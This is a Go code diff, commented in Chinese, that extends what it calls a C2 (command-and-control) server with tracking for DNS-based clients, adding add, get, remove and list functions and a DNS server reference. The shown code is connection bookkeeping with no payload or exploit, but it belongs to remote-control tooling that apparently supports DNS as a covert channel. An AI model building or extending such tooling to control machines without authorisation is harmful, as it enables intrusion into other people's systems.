@@ -8,11 +8,13 @@ import (
 
 // Server 表示C2服务器，管理客户端和控制端连接
 type Server struct {
-	listenAddr  string               // 监听地址
-	clients     map[int]*Client      // 客户端连接映射
-	controllers map[*Controller]bool // 控制端连接映射
-	nextID      int                  // 下一个客户端ID
-	mu          sync.Mutex           // 互斥锁
+	listenAddr  string                // 监听地址
+	clients     map[int]*Client       // 客户端连接映射(客户端ID -> Client)
+	dnsClients  map[string]*DNSClient // DNS客户端映射(客户端标识 -> DNSClient)
+	controllers map[*Controller]bool  // 控制端连接映射
+	nextID      int                   // 下一个客户端ID
+	mu          sync.Mutex            // 互斥锁
+	dnsServer   *DNSServer            // DNS服务器引用
 }
 
 // NewServer 创建新的服务器实例
@@ -20,6 +22,7 @@ func NewServer(listenAddr string) *Server {
 	return &Server{
 		listenAddr:  listenAddr,
 		clients:     make(map[int]*Client),
+		dnsClients:  make(map[string]*DNSClient),
 		controllers: make(map[*Controller]bool),
 		nextID:      1,
 	}
@@ -107,6 +110,46 @@ func (s *Server) handleClientConnection(conn net.Conn) {
 	// 客户端断开后清理
 	s.RemoveClient(clientID)
 	fmt.Printf("客户端 #%d 已断开连接\n", clientID)
+}
+
+// SetDNSServer 设置关联的DNS服务器
+func (s *Server) SetDNSServer(dnsServer *DNSServer) {
+	s.dnsServer = dnsServer
+}
+
+// AddDNSClient 添加DNS客户端
+func (s *Server) AddDNSClient(clientID string, client *DNSClient) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	s.dnsClients[clientID] = client
+	fmt.Printf("DNS客户端 %s 已添加\n", clientID)
+}
+
+// GetDNSClient 获取DNS客户端
+func (s *Server) GetDNSClient(clientID string) *DNSClient {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	return s.dnsClients[clientID]
+}
+
+// RemoveDNSClient 移除DNS客户端
+func (s *Server) RemoveDNSClient(clientID string) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	delete(s.dnsClients, clientID)
+	fmt.Printf("DNS客户端 %s 已移除\n", clientID)
+}
+
+// ListDNSClients 返回所有DNS客户端
+func (s *Server) ListDNSClients() []*DNSClient {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	clients := make([]*DNSClient, 0, len(s.dnsClients))
+	for _, client := range s.dnsClients {
+		clients = append(clients, client)
+	}
+	return clients
 }
 
 // ListClients 返回所有已连接的客户端
